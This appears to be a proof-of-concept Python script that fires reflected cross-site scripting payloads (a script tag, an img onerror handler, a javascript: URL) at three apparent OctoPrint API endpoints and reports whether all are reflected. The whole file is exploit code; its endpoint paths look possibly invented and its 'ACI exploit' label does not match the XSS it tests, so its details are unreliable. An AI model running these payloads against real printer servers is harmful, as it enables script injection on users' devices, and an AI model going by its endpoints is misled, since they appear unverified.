import requests

# Define the URL where the vulnerable functions are exposed
base_url = "http://localhost:5000"  # This should be the URL where OctoPrint is running

# Define the payloads that exploit the XSS vulnerability
payloads = [
    "<script>alert('XSS');</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')"
]

# Function to test the vulnerability in determineWebcamStreamType
def test_determineWebcamStreamType():
    url = f"{base_url}/api/webcam?type={payloads[0]}"
    response = requests.get(url)
    if payloads[0] in response.text:
        return True
    return False

# Function to test the vulnerability in getExternalHostUrl
def test_getExternalHostUrl():
    url = f"{base_url}/api/externalHost?url={payloads[1]}"
    response = requests.get(url)
    if payloads[1] in response.text:
        return True
    return False

# Function to test the vulnerability in validateWebcamUrl
def test_validateWebcamUrl():
    url = f"{base_url}/api/validateUrl?url={payloads[2]}"
    response = requests.get(url)
    if payloads[2] in response.text:
        return True
    return False

# Run the tests
if test_determineWebcamStreamType() and test_getExternalHostUrl() and test_validateWebcamUrl():
    print("The ACI exploit success!!!")
else:
    print("The ACI exploit failed!!!")
